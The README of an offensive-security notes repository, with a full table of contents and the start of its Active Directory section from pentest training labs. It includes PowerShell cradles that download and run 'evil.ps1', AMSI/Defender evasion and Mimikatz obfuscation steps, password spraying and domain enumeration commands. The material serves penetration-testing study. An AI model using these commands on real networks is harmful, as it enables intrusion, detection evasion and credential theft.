```ruby
███████╗ █████╗ ███████╗██╗   ██╗ ██████╗
██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔════╝
█████╗  ███████║███████╗ ╚████╔╝ ██║  ███╗
██╔══╝  ██╔══██║╚════██║  ╚██╔╝  ██║   ██║
███████╗██║  ██║███████║   ██║   ╚██████╔╝
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝
Made with <3 by Riccardo Malatesta (@seeu)
```
[![License](https://img.shields.io/github/license/seeu-inspace/easyg)](LICENSE)
[![Open Source Love](https://badges.frapsoft.com/os/v1/open-source.svg?v=103)](https://github.com/ellerbrock/open-source-badges/)

EasyG started out as a script that I use to automate some information gathering tasks for my hacking process, [you can find it here](scripts/). Now it's more than that. Here I gather all the resources about hacking that I find interesting: notes, payloads, tools and more.

I try as much as possible to link to the various sources or inspiration for these notes. A large part of these notes are from: [PTS v4](https://blog.elearnsecurity.com/introducing-the-ptsv4-training-course.html), [PortSwigger Web Security Academy](https://portswigger.net/web-security), [PEN-200](https://www.offsec.com/courses/pen-200/), [Proving Grounds](https://www.offsec.com/labs/individual/), ["Attacking and Defending Active Directory Lab (CRTP)" by Altered Security](https://www.alteredsecurity.com/adlab), [TryHackMe](https://tryhackme.com/), [Hack The Box](https://hackthebox.com/), [PentesterLab](https://pentesterlab.com/), [HackTricks](https://book.hacktricks.xyz/), [Jhaddix](https://twitter.com/Jhaddix), [The Cyber Mentor](https://www.thecybermentor.com/), [NahamSec](https://www.youtube.com/@NahamSec) (and [NahamCon](https://www.nahamcon.com/)), InfoSec Twitter and many other amazing people.

## Table of Contents

- [Resources](resources/#resources)
- [Useful tips](useful-tips/#useful-tips)
  - [Glossary](useful-tips/#glossary)
  - [Client-specific key areas of concern](useful-tips/#client-specific-key-areas-of-concern)
  - [General notes](useful-tips/#general-notes)
    - [Default Credentials](useful-tips/#default-credentials)
    - [PT initial foothold](useful-tips/#pt-initial-foothold)
    - [SSH notes](useful-tips/#ssh-notes)
    - [FTP notes](useful-tips/#ftp-notes)
    - [Git commands / shell](useful-tips/#git-commands--shell)
    - [Remote Desktop](useful-tips/#remote-desktop)
    - [SQL connections](useful-tips/#sql-connections)
    - [Reverse engineering](useful-tips/#reverse-engineering)
    - [File upload](useful-tips/#file-upload)
    - [Shells](useful-tips/#shells)
- [Check-lists](check-lists/#check-lists)
  - [Toolset](check-lists/#toolset) 
  - [Testing layers](check-lists/#testing-layers)
  - [Penetration Testing cycle](check-lists/#penetration-testing-cycle)
  - [Penetration Testing process](check-lists/#penetration-testing-process)
  - [Bug Bounty Hunting](check-lists/#bug-bounty-hunting)
    - [Top vulnerabilities to always look for](check-lists/#top-vulnerabilities-to-always-look-for)
    - [Multiple targets](check-lists/#multiple-targets)
    - [Single target](check-lists/#single-target)
- [Linux](linux/#linux)
- [Tools](tools/#tools)
  - [EasyG](tools/#easyg)
  - [Burp Suite](tools/#burp-suite)
  - [Netcat](tools/#netcat)
  - [Socat](tools/#socat)
  - [PowerShell](tools/#powershell)
  - [WireShark](tools/#wireshark)
  - [Tcpdump](tools/#tcpdump)
  - [Bash scripting](tools/#bash-scripting)
  - [Metasploit Framework](tools/#metasploit-framework)
    - [Starting Metasploit](tools/#starting-metasploit)
    - [MSF Syntax](tools/#msf-syntax)
    - [Exploit Modules](tools/#exploit-modules)
    - [Post-Exploitation](tools/#post-exploitation)
  - [Others](tools/#others)
- [Passive Information Gathering (OSINT)](passive-information-gathering-osint/#passive-information-gathering-osint)
  - [Notes](passive-information-gathering-osint/#notes)
  - [Tools](passive-information-gathering-osint/#tools)
  - [Target validation](passive-information-gathering-osint/#target-validation)
  - [User Information Gathering](passive-information-gathering-osint/#user-information-gathering)
- [Active Information Gathering](active-information-gathering/#active-information-gathering)
  - [DNS Enumeration](active-information-gathering/#dns-enumeration)
  - [Port Scanning](active-information-gathering/#port-scanning)
    - [Netcat](active-information-gathering/#netcat)
    - [Nmap](active-information-gathering/#nmap)
    - [Masscan](active-information-gathering/#masscan)
    - [Other tools](active-information-gathering/#other-tools)
  - [SMB Enumeration](active-information-gathering/#smb-enumeration)
  - [NFS Enumeration](active-information-gathering/#nfs-enumeration)
  - [SNMP Enumeration](active-information-gathering/#snmp-enumeration)
  - [HTTP / HTTPS enumeration](active-information-gathering/#http--https-enumeration)
  - [SSH enumeration](active-information-gathering/#ssh-enumeration)
- [Content Discovery](content-discovery/#content-discovery)
  - [Google Dorking](content-discovery/#google-dorking)
  - [GitHub Dorking](content-discovery/#github-dorking)
  - [Shodan Dorking](content-discovery/#shodan-dorking)
- [Networking](networking/#networking)
- [Source code review](source-code-review/#source-code-review)
- [Vulnerability Scanning](vulnerability-scanning/#vulnerability-scanning)
  - [Nessus](vulnerability-scanning/#nessus)
  - [Nmap](vulnerability-scanning/#nmap)
  - [Nikto](vulnerability-scanning/#nikto)
  - [Nuclei](vulnerability-scanning/#nuclei)
- [Web vulnerabilities](web-vulnerabilities/#web-vulnerabilities)
  - [SQL Injection](web-vulnerabilities/#sql-injection)
  - [Authentication vulnerabilities](web-vulnerabilities/#authentication-vulnerabilities)
  - [Directory Traversal](web-vulnerabilities/#directory-traversal)
  - [File inclusion](web-vulnerabilities/#file-inclusion)
  - [OS Command Injection](web-vulnerabilities/#os-command-injection)
  - [Business logic vulnerabilities](web-vulnerabilities/#business-logic-vulnerabilities)
  - [Information Disclosure](web-vulnerabilities/#information-disclosure)
  - [Access control vulnerabilities and privilege escalation](web-vulnerabilities/#access-control-vulnerabilities-and-privilege-escalation)
  - [File upload vulnerabilities](web-vulnerabilities/#file-upload-vulnerabilities)
    - [Web shells](useful-tips#shells)
  - [Server-side request forgery (SSRF)](web-vulnerabilities/#server-side-request-forgery-ssrf)
  - [Open redirection](web-vulnerabilities/#open-redirection)
  - [XXE injection](web-vulnerabilities/#xxe-injection)
  - [Cross-site scripting (XSS)](web-vulnerabilities/#cross-site-scripting-xss)
  - [Cross-site request forgery (CSRF)](web-vulnerabilities/#cross-site-request-forgery-csrf)
  - [Cross-origin resource sharing (CORS)](web-vulnerabilities/#cross-origin-resource-sharing-cors)
  - [Clickjacking](web-vulnerabilities/#clickjacking)
  - [DOM-based vulnerabilities](web-vulnerabilities/#dom-based-vulnerabilities)
  - [WebSockets](web-vulnerabilities/#websockets)
  - [Insecure deserialization](web-vulnerabilities/#insecure-deserialization)
  - [Server-side template injection](web-vulnerabilities/#server-side-template-injection)
  - [Web cache poisoning](web-vulnerabilities/#web-cache-poisoning)
  - [HTTP Host header attacks](web-vulnerabilities/#http-host-header-attacks)
  - [HTTP request smuggling](web-vulnerabilities/#http-request-smuggling)
  - [OAuth authentication](web-vulnerabilities/#oauth-authentication)
  - [JWT Attacks](web-vulnerabilities/#jwt-attacks)
  - [GraphQL](web-vulnerabilities/#graphql)
  - [WordPress](web-vulnerabilities/#wordpress)
  - [IIS - Internet Information Services](web-vulnerabilities/#iis---internet-information-services)
  - [Microsoft SharePoint](web-vulnerabilities/#microsoft-sharepoint)
  - [Lotus Domino](web-vulnerabilities/#lotus-domino)
  - [phpLDAPadmin](web-vulnerabilities/#phpLDAPadmin)
  - [Git source code exposure](web-vulnerabilities/#git-source-code-exposure)
  - [Subdomain takeover](web-vulnerabilities/#subdomain-takeover)
  - [4** Bypass](web-vulnerabilities/#4-bypass)
  - [Application level Denial of Service](web-vulnerabilities/#application-level-denial-of-service)
  - [APIs attacks](web-vulnerabilities/#apis-attacks)
  - [Grafana attacks](web-vulnerabilities/#grafana-attacks)
  - [Confluence attacks](web-vulnerabilities/#confluence-attacks)
  - [Kibana](web-vulnerabilities/#kibana)
  - [Argus Surveillance DVR](web-vulnerabilities/#argus-surveillance-dvr)
  - [Shellshock](web-vulnerabilities/#shellshock)
  - [Cassandra web](web-vulnerabilities/#cassandra-web)
  - [RaspAP](web-vulnerabilities/#raspap)
  - [Drupal](web-vulnerabilities/#drupal)
  - [Tomcat](web-vulnerabilities/#tomcat)
  - [Booked Scheduler](web-vulnerabilities/#booked-scheduler)
  - [phpMyAdmin](web-vulnerabilities/#phpmyadmin)
  - [PHP](web-vulnerabilities/#php)
  - [Symphony](web-vulnerabilities/#symphony)
  - [Adobe ColdFusion](web-vulnerabilities/#adobe-coldfusion)
  - [Webmin](web-vulnerabilities/#webmin)
  - [Broken Link Hijacking](web-vulnerabilities/#broken-link-hijacking)
- [Client-Side Attacks](client-side-attacks/#client-side-attacks)
  - [Client Information Gathering](client-side-attacks/#client-information-gathering)
  - [HTML applications](client-side-attacks/#html-applications)
  - [Microsoft Office](client-side-attacks/#microsoft-office)
  - [Windows Library Files](client-side-attacks/#windows-library-files)
  - [McAfee](client-side-attacks/#mcafee)
- [Server-side Attacks](server-side-attacks/#server-side-attacks)
  - [NFS](server-side-attacks/#nfs)
  - [IKE - Internet Key Exchange](server-side-attacks/#ike---internet-key-exchange)
  - [SNMP](server-side-attacks/#snmp)
  - [NodeJS](server-side-attacks/#nodejs)
  - [Python](server-side-attacks/#python)
  - [Redis 6379](server-side-attacks/#redis-6379)
  - [Oracle TNS](server-side-attacks/#oracle-tns)
  - [Memcached](server-side-attacks/#memcached)
  - [SMTP / IMAP](server-side-attacks/#smtp--imap)
  - [113 ident](server-side-attacks/#113-ident)
  - [FreeSWITCH](server-side-attacks/#freeswitch)
  - [Umbraco](server-side-attacks/#umbraco)
  - [VoIP penetration test](server-side-attacks/#voip-penetration-test)
  - [DNS](server-side-attacks/#dns)
- [Thick client vulnerabilities](thick-client-vulnerabilities/#thick-client-vulnerabilities)
  - [DLL Hijacking](thick-client-vulnerabilities/#dll-hijacking)
  - [Insecure application design](thick-client-vulnerabilities/#insecure-application-design)
  - [Weak Hashing Algorithms](thick-client-vulnerabilities/#weak-hashing-algorithms)
  - [Cleartext secrets in memory](thick-client-vulnerabilities/#cleartext-secrets-in-memory)
  - [Hardcoded secrets](thick-client-vulnerabilities/#hardcoded-secrets)
  - [Unsigned binaries](thick-client-vulnerabilities/#unsigned-binaries)
  - [Lack of verification of the server certificate](thick-client-vulnerabilities/#lack-of-verification-of-the-server-certificate)
  - [Insecure SSL/TLS configuration](thick-client-vulnerabilities/#insecure-ssltls-configuration)
  - [Remote Code Execution via Citrix Escape](thick-client-vulnerabilities/#remote-code-execution-via-citrix-escape)
  - [Direct database access](thick-client-vulnerabilities/#direct-database-access)
  - [Insecure Windows Service permissions](thick-client-vulnerabilities/#insecure-windows-service-permissions)
  - [Code injection](thick-client-vulnerabilities/#code-injection)
  - [Windows persistence](thick-client-vulnerabilities/#windows-persistence)
- [System Attacks](system-attacks/#system-attacks)
  - [Information gathering](system-attacks/#information-gathering)
    - [Windows](system-attacks/#windows)
    - [Linux](system-attacks/#linux)
  - [Password Attacks](system-attacks/#password-attacks)
    - [Wordlists](system-attacks/#wordlists)
    - [Password Cracking](system-attacks/#password-cracking)
    - [Network Service Attack](system-attacks/#network-service-attack)
    - [Leveraging Password Hashes](system-attacks/#leveraging-password-hashes)
  - [Port Redirection and Tunneling](system-attacks/#port-redirection-and-tunneling)
    - [Port Forwarding](system-attacks/#port-forwarding)
    - [SSH Tunneling](system-attacks/#ssh-tunneling)
    - [ssh.exe](system-attacks/#sshexe)
    - [Plink.exe](system-attacks/#plinkexe)
    - [Netsh](system-attacks/#netsh)
    - [Chisel](system-attacks/#chisel)
    - [DNS Tunneling](system-attacks/#dns-tunneling)
    - [Metasploit Portfwd](system-attacks/#metasploit-portfwd)
  - [Linux Privilege Escalation](system-attacks/#linux-privilege-escalation)
    - [Resources](system-attacks/#resources)
    - [Strategy](system-attacks/#strategy)
    - [Reverse Shell](system-attacks/#reverse-shell)
    - [Service Exploits](system-attacks/#service-exploits)
    - [Weak File Permissions](system-attacks/#weak-file-permissions)
    - [Exposed Confidential Information](system-attacks/#exposed-confidential-information)
    - [SSH](system-attacks/#ssh)
    - [Sudo](system-attacks/#sudo)
    - [Cron Jobs](system-attacks/#cron-jobs)
    - [SUID / SGID Executables](system-attacks/#suid--sgid-executables)
    - [Passwords & Keys](system-attacks/#passwords--keys)
    - [Kernel Exploits](system-attacks/#kernel-exploits)
    - [find with exec](system-attacks/#find-with-exec)
    - [find PE](system-attacks/#find-pe)
    - [Abusing capabilities](system-attacks/#abusing-capabilities)
    - [Escape shell](system-attacks/#escape-shell)
    - [Docker](system-attacks/#docker)
    - [User groups](system-attacks/#user-groups)
    - [fail2ban](system-attacks/#fail2ban)
    - [Postfix](system-attacks/#postfix)
  - [Windows Privilege Escalation](system-attacks/#windows-privilege-escalation)
    - [Resources](system-attacks/#resources-1)
    - [Strategy](system-attacks/#strategy-1)
    - [Privileges](system-attacks/#privileges)
    - [Privileged Groups](system-attacks/#privileged-groups)
    - [Add new admin user](system-attacks/#add-new-admin-user)
    - [Log in with another user from the same machine](system-attacks/#log-in-with-another-user-from-the-same-machine)
    - [Generate a reverse shell](system-attacks/#generate-a-reverse-shell)
    - [Kernel Exploits](system-attacks/#kernel-exploits-1)
    - [Driver Exploits](system-attacks/#driver-exploits)
    - [Service Exploits](system-attacks/#service-exploits-1)
    - [CVEs](system-attacks/#cves)
    - [User Account Control (UAC)](system-attacks/#user-account-control-uac)
    - [Insecure File Permissions](system-attacks/#insecure-file-permissions)
    - [Registry](system-attacks/#registry)
    - [Passwords](system-attacks/#passwords)
    - [Scheduled Tasks](system-attacks/#scheduled-tasks)
    - [Installed Applications](system-attacks/#installed-applications)
    - [Startup Apps](system-attacks/#startup-apps)
    - [Hot Potato](system-attacks/#hot-potato)
    - [Token Impersonation](system-attacks/#token-impersonation)
    - [getsystem](system-attacks/#getsystem)
    - [Pass The Hash](system-attacks/#pass-the-hash-1)
    - [Pass The Password](system-attacks/#pass-the-password)
    - [Apache lateral movement](system-attacks/#apache-lateral-movement)
    - [Read data stream](system-attacks/#read-data-stream)
    - [PrintNightmare](system-attacks/#printnightmare)
    - [Bypass CLM / CLM breakout | CLM / AppLocker Break Out](system-attacks/#bypass-clm--clm-breakout--clm--applocker-break-out)
    - [From Local Admin to System](system-attacks/#from-local-admin-to-system)
    - [TeamViewer](system-attacks/#teamviewer)
    - [Exploiting service through Symbolic Links](system-attacks/#exploiting-service-through-symbolic-links)
    - [Write privileges](system-attacks/#write-privileges)
    - [Services running - Autorun](system-attacks/#services-running---autorun)
    - [CEF Debugging Background](system-attacks/#cef-debugging-background)
    - [Feature Abuse](system-attacks/#feature-abuse)
  - [Buffer Overflow](system-attacks/#buffer-overflow)
  - [Antivirus Evasion](system-attacks/#antivirus-evasion)
    - [ToDo](system-attacks/#todo)
    - [With Evil-WinRM](system-attacks/#with-evil-winrm)
    - [Thread Injection](system-attacks/#thread-injection)
    - [Shellter](system-attacks/#shellter)
- [Active Directory](active-directory/#active-directory)
  - [Notes](active-directory/#notes)
  - [Initial foothold](active-directory/#initial-foothold)
  - [Manual Enumeration](active-directory/#manual-enumeration)
  - [SMB](active-directory/#smb)
  - [RPC](active-directory/#rpc)
  - [Azure](active-directory/#azure)
  - [LDAP](active-directory/#ldap)
  - [PowerView](active-directory/#powerview)
  - [PsLoggedOn](active-directory/#psloggedon)
  - [Service Principal Names Enumeration](active-directory/#service-principal-names-enumeration)
  - [Object Permissions Enumeration](active-directory/#object-permissions-enumeration)
  - [Domain Shares Enumeration](active-directory/#domain-shares-enumeration)
  - [SharpHound](active-directory/#sharphound)
  - [BloodHound](active-directory/#bloodhound)
  - [Mimikatz](active-directory/#mimikatz)
  - [Active Directory Authentication Attacks](active-directory/#active-directory-authentication-attacks)
  - [Lateral Movement Techniques and Pivoting](active-directory/#lateral-movement-techniques-and-pivoting)
  - [Credentials Harvesting](active-directory/#credentials-harvesting)
  - [Offensive .NET](active-directory/#offensive-net)
  - [Active Directory Persistence](active-directory/#active-directory-persistence)
  - [Active Directory Privilege Escalation](active-directory/#active-directory-privilege-escalation)
- [Mobile](mobile/#mobile)
  - [Missing Certificate and Public Key Pinning](mobile/#missing-certificate-and-public-key-pinning)
  - [Cordova attacks](mobile/#cordova-attacks)
- [Cloud hacking](cloud-hacking/#cloud-hacking)
  - [Abusing S3 Bucket Permissions](cloud-hacking/#abusing-s3-bucket-permissions)
  - [AWS Cognito](cloud-hacking/#aws-cognito)
  - [Google Cloud Storage bucket](cloud-hacking/#google-cloud-storage-bucket)
- [Artificial intelligence vulnerabilities](artificial-intelligence-vulnerabilities#artificial-intelligence-vulnerabilities)
  - [Prompt Injection](artificial-intelligence-vulnerabilities#prompt-injection)

### <ins>Active Directory</ins>

#### <ins>Notes</ins>

| Server | Algorithm available |
| ---    | ---                 |
| Windows 2003 | NTLM |
| Windows Server 2008 or later | NTLM and SHA-1 |
| - Old Windows OS (like Windows 7)<br/> - OS that have it manually set | [WDigest](https://technet.microsoft.com/en-us/library/cc778868(v=ws.10).aspx) |

When you compromise a Domain Controller, you want to be able to get the ntds.dit file
- Contains password hashes
- ticket attack, pass the hash attack, crack the password etc
- generally stored in %SystemRoot%\NTDS


**Cheat sheets**
- [cheatsheet-active-directory.md](https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md)
- [Cheat Sheet - Active Directory](https://github.com/drak3hft7/Cheat-Sheet---Active-Directory)
- [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
- [Active Directory Attack.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [HackTricks Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [Section 18: Active Directory Attacks](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#section-18-active-directory-attacks)
- [Pentesting_Active_directory mindmap](https://web.archive.org/web/20220607072235/https://www.xmind.net/m/5dypm8/)
- [WADComs](https://wadcoms.github.io/)

**Common Terminology**
- AD Component: trees, forest, domain tree, domain forest
  https://techiepraveen.wordpress.com/2010/09/04/basic-active-directory-components/
- https://tryhackme.com/room/attackingkerberos  Task 1
- More resources:
  https://tryhackme.com/room/attackingkerberos  Task 9

**ACEs**
- ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
- AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
- GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
- GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
- WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
- WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
- AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.
- The highest permission is `GenericAll`. Note also `GenericWrite`, `WriteOwner`, `WriteDACL`, `AllExtendedRights`, `ForceChangePassword`, `Self (Self-Membership)`


**Services that can be configured for delegation**
- HTTP - Used for web applications to allow pass-through authentication using AD credentials.
- CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.
- LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
- HOST - Allows delegation of account for all activities on the host.
- MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.


**Basics commands**
- Perform a password reset
  - `Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose`
- Make user change password next logon
  - `Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose`

**Work with modules and scripts**

Import a `.psd1` script (get all the commands from a module with `Get-Command -module <name-module>`)
- `Import-Module script.psd1`
- `iex (New-Object Net.WebClient).DownloadString('https://IP/payload.ps1')`
- `$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://IP/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response`
- PSv3 onwards: `iex(iwr 'http://IP/evil.ps1')`
- `$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://IP/evil.ps1',$false);$h.send();iex $h.responseText`
- `$wr = [System.NET.WebRequest]::Create("http://IP/evil.ps1")`<br/>
  `$r = $wr.GetResponse()`<br/>
  `IEX (System.IO.StreamReader).ReadToEnd()`

PowerShell Detections
- System-wide transcription
- Script Block logging
- AntiMalware Scan Interface (AMSI)
- Constrained Language Mode (CLM) - Integrated with Applocker and WDAC (Device Guard)

PowerShell Detections bypass
- Use [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell
- [AMSITrigger](https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected as malicious: `AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1`
- [DefenderCheck](https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary / file that Windows Defender may flag: `DefenderCheck.exe PowerUp.ps1`
- For full obfuscation of PowerShell scripts, see [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

Steps to avoid signature based detection:
1. Scan using AMSITrigger
2. Modify the detected code snippet
3. Rescan using AMSITrigger
4. Repeat the steps 2 & 3 till we get a result as "AMSI_RESULT_NOT_DETECTED" or "Blank"

For Mimikatz, make the following changes:
1. Remove default comments
2. Rename the script, function names and variables
3. Modify the variable names of the Win32 API calls that are detected
4. Obfuscate PEBytes content → PowerKatz dll using packers (tool: [ProtectMyTooling](https://github.com/mgeeky/ProtectMyTooling))
5. Implement a reverse function for PEBytes to avoid any static signatures
6. Add a sandbox check to waste dynamic analysis resources
7. Remove Reflective PE warnings for a clean output
8. Use obfuscated commands for Invoke-MimiEx execution
9. Analysis using DefenderCheck

**Good OPSEC**
- It’s better to use a Windows OS to increase stealth and flexibility.
- Always make sure to use a LDAP based tools, never .NET commands (SAMR)
- Always enumerate first, do not grab the low hanging fruit first, since it may be a decoy. Also check logon count and login policy.
  - An example: run `Get-DomainUser | select samaccountname, logonCount`, if you see an account that seems like a low hanging fruit but has zero logons, it might be a decoy or a dorment user.
  - Check: logonCount, lastlogontimestamp, badpasswordtime, Description
  - Take also in consideration your target organization: is this their first assesment? Do they invest in their security (time, effort)?
- Making changes to the local administrator group is one of the noisiest things you can do

**Misc notes**
- Check for `Domain Admins` and `Service Accounts` groups
- Add an account to a group
  - `net group "<group>" <user> /add /domain`
  - Verify the success of the command with `Get-NetGroup "<group>" | select member`
  - Delete the `<user>` with `/del` instead of `/add`
- Use `gpp-decrypt` to decrypt a given GPP encrypted string
- Note `ActiveDirectoryRights` and `SecurityIdentifier` for each object enumerated during [Object Permissions Enumeration](#bbject-permissions-enumeration)
  - See: [ActiveDirectoryRights Enum (System.DirectoryServices)](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- If you get lost, see the notes for the Hutch, Heist, and Vault machines
- File config for responder: `/usr/share/responder/Responder.conf`
- Do password spray only on local account
  - `Rubeus.exe brute /password:Password1 /noticket`
    - Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file
    - `echo 10.10.187.139 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
- Kerberos Abuse: https://blog.spookysec.net/kerberos-abuse/
- To transfer files use smbserver: `sudo impacket-smbserver -smb2support share /home/kali/Downloads/`
- Certificate signing request for WinRM: https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
  - WinRM shell: https://raw.githubusercontent.com/Alamot/code-snippets/master/winrm/winrm_shell.rb
- NTLM Auth: https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#beyond-root---ntlm-auth
- Not all the usernames found are always the ones that work. For example: you might find autologon creds `svc_loanmanager:Moneymakestheworldgoround!` which however lead to login with `evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'`
- Every time that you think about Active Directory, think about a Forest, not a Domain. If one domain is compromised, so it is the entire forest. Whithin a forest, all the domains trust each others. This is why a forest is considered a security boundry.
- Making changes to the local administrator group is one of the noisiest thing you can do


#### <ins>Initial foothold</ins>
- run `responder` + `mitm6`
- `enum4linux -a -u "" -p "" 192.168.180.30`
- `nmap -Pn -T4 -p- --min-rate=1000 -sV -vvv 10.10.108.190 -oN nmap_results`
- `nmap -p- -A -nP 192.168.212.165 -oN nmap_results`
- `dig @192.168.212.165 AXFR heist.offsec`
- `dnsenum 192.168.174.187`
- After this
  - [ ] 53, zone transfer + info collection
  - [ ] 139/445 Check SMB / smbclient
    - check upload of web shells / phishing
    - check eternal blue
    - check default creds
  - [ ] 389 Check ldapsearch
    - use windapsearch.py
    - try LDAP Pass-back attack
  - [ ] Check rpcclient
  - [ ] Check all services in scope, like web vulnerabilities, ftp etc.
  - [ ] Enumerate any AS-REP / Kerberos roastable users
  - [ ] Check ZeroLogon
  - [ ] Check every section of this file
  - [ ] Check default creds
    - also in Printers, Jenkins etc.
  - [ ] Check: 
    - https://infosecwriteups.com/active-directory-penetration-testing-cheatsheet-5f45aa5b44ff
    - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
    - https://wadcoms.github.io/ <# interactive cheat-sheet #>
    - https://github.com/seeu-inspace/easyg
  - [ ] 464 kpasswd -> try Kerberoast
  - [ ] Test NFS -> port 111, 2049 (see even if nmap doesn't mark it as NFS)
  - [ ] If you don't find something here, see exploitaiton-notes
  - [ ] Check kerberoasting
    - Not only kerbrute etc., try also to retrieve TGS ticket
    - Test AS-REP roasting and Kerberoasting
    - AS-REP, Kerberost, Rubeus (con e senza creds)
  - [ ] If you find creds / hashes, try:
    - crackmapexec to see a reuse of creds
    - evil-winrm
    - kerberoasting impacket-GetUserSPNs
      - AS-REP, Kerberost, Rubeus
    - enum4linux (once without auth and only once with creds)
      - see descriptions
    - smbclient
    - ldap
- PrivEsc / Post Access
  - [ ] enumerate with bloodhound, powershell, powerview
  - [ ] Check privileges
    - whoami /priv, Get-ADUser -identity s.smith -properties *
  - [ ] try access with rdp
  - [ ] mimikatz.exe
  - [ ] test creds already found
    - crackmapexec, ldap with auth, enum4linux (see descriptions), smbclient
    - kerberoast (AS-REP, Kerberost, Rubeus, etc. -> retrieve TGS)
    - secrets dump, impacket-psexec, impacket-wmiexec, evil-winrm
    - test also hashes
  - [ ] Azure
  - [ ] Play with Rubeus
  - [ ] See DCSync (try with various tools, come aclpwn)
  - [ ] See all sections of this document
  - [ ] See powershell history
  - [ ] Run Seatbelt first, then winPEAS


#### <ins>Manual Enumeration</ins>

#### Legacy Windows applications

```
net user /domain                       display users in the domain
net user <username> /domain            net-user against a specific user
net group /domain                      enumerate groups in the domain
net group "<group-name>" /domain       display members in specific group
```

#### PowerShell and .NET

```
LDAP://host[:port][/DistinguishedName]                                      LDAP path format. CN = Common Name; DC = Domain Component;
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()       domain class from System.DirectoryServices.ActiveDirectory namespace
powershell -ep bypass                                                       bypass the execution policy
([adsi]'').distinguishedName                                                obtain the DN for the domain
```

#### PowerView

```
Misc
----
Import-Module .\PowerView.ps1                                                                                                             Import PowerView; https://powersploit.readthedocs.io/en/latest/Recon/
Get-NetDomain                                                                                                                             Obtain domain information
Get-NetUser | select cn,pwdlastset,lastlogon                                                                                              Obtain users in the domain; username only
Get-NetGroup | select cn                                                                                                                  Obtain groups in the domain
Get-NetGroup "GROUP-NAME" | select member                                                                                                 Enumerate a specific group
Get-NetComputer                                                                                                                           Enumerate the computer objects in the domain
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion                                                               Display OS and hostname
Find-LocalAdminAccess                                                                                                                     Scan domain to find local administrative privileges for our user
Get-NetSession -ComputerName INPUT -Verbose                                                                                               Check logged on users with Get-NetSession
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl                                                   Display permissions on the DefaultSecurity registry hive
Get-NetUser -SPN                                                                                                                          Kerberoastable users
Get-ADGroupMember 'Web Admins'                                                                                                            Get details about a group, in this case, 'Web Admins'
Get-NetUser | select Description                                                                                                          Enumerate the domain users descriptions
Get-NetGroup -GroupName *admin*                                                                                                           Enumerate the domain groups
Get-NetComputer -fulldata | select operatingsystem                                                                                        Find all operating systems running
Get-DomainPolicyData                                                                                                                      Retrieve domain policy for the current domain
(Get-DomainPolicyData).systemaccess                                                                                                       Retrieve domain policy for the current domain
(Get-DomainPolicyData -domain moneycorp.local).systemaccess                                                                               Retrieve domain policy for another domain
Get-DomainController                                                                                                                      Retrieve domain controllers for the current domain
Get-DomainController -Domain moneycorp.local                                                                                              Retrieve domain controllers for another domain
Get-DomainGroup *admin*                                                                                                                   Retrieve all groups containing the word "admin" in group name
Get-DomainGroupMember -Identity "Domain Admins" -Recurse                                                                                  Retrieve all the members of the Domain Admins group
Get-DomainGroup -UserName "user1"                                                                                                         Retrieve the group membership for a user
Get-NetLocalGroup -ComputerName dcorp-dc                                                                                                  List all the local groups on a machine (administrator privs on non-dc machines needed)
Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators                                                                  Retrieve members of the local group "Administrators" on a machine (administrator privs on non-dc machines needed)
Get-NetLoggedon -ComputerName dcorp-adminsrv                                                                                              Retrieve actively logged users on a computer (local admin rights on the target needed)
Get-LoggedonLocal -ComputerName dcorp-adminsrv                                                                                            Retrieve locally logged users on a computer (remote registry on the target - started by-default on server OS needed)
Get-LastLoggedOn -ComputerName dcorp-adminsrv                                                                                             Retrieve the last logged user on a computer (administrative rights and remote registry on the target needed)
Invoke-FileFinder -Verbose                                                                                                                Find sensitive files on computers in the domain
Get-NetFileServer                                                                                                                         Get all fileservers of the domain
Get-DomainGPOLocalGroup                                                                                                                   Retrieve GPO(s) which use Restricted Groups or groups.xml for interesting users
